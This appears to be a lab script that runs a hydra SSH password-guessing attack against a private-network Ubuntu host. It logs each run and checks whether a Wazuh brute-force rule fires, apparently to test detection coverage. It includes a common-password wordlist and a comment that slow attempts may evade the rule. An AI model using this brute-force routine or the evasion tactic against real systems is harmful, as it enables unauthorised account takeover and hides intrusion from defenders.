#!/usr/bin/env bash
# T1110.001 - Brute Force: Password Guessing
# Runs hydra against the Ubuntu SSH service and logs the run to attack_log.csv.
#
# Usage:  ./T1110_ssh_brute.sh [target_ip] [tasks] [wordlist]
#   target_ip  default 172.20.10.12  (Ubuntu / SOC)
#   tasks      default 4             (-t parallel connections; vary 1..16)
#   wordlist   default ~/lab-wordlist.txt
#
# The 'tasks' value is the interesting variable. At -t 1 the attempts are
# slow enough that they may fall below rule 5712's frequency threshold and
# evade detection. That miss is a RESULT worth recording, not a failure.

set -uo pipefail
source "$(dirname "$0")/_log.sh"

TARGET="${1:-172.20.10.12}"
TASKS="${2:-4}"
WORDLIST="${3:-$HOME/lab-wordlist.txt}"
USER_ACCOUNT="labtarget"
EXPECTED_RULE="5712"   # Wazuh built-in: sshd brute force

if [ ! -f "$WORDLIST" ]; then
  echo "[!] Wordlist not found: $WORDLIST"
  echo "    Create one with:"
  echo "    printf 'password\\n123456\\nadmin\\nletmein\\nwelcome\\nqwerty\\nlabtarget\\nchangeme\\n' > $WORDLIST"
  exit 1
fi

CMD="hydra -l $USER_ACCOUNT -P $WORDLIST -t $TASKS -f ssh://$TARGET"

echo "[*] T1110.001 SSH brute force"
echo "    target : $TARGET"
echo "    tasks  : $TASKS"
echo "    words  : $(wc -l < "$WORDLIST") entries"
echo

START=$(now_utc)
echo "[*] start $START"
timeout 300 $CMD
END=$(now_utc)
echo "[*] end   $END"

log_attack "$(next_run_id)" "$START" "$END" "SSH brute force" "T1110.001" \
  "kali-attacker" "$TARGET" "$CMD" "$EXPECTED_RULE" "t=$TASKS" "password guessing"

echo
echo "[i] On Ubuntu, check for the detection:"
echo "    sudo grep '\"id\":\"5712\"' /var/ossec/logs/alerts/alerts.json | tail -1"
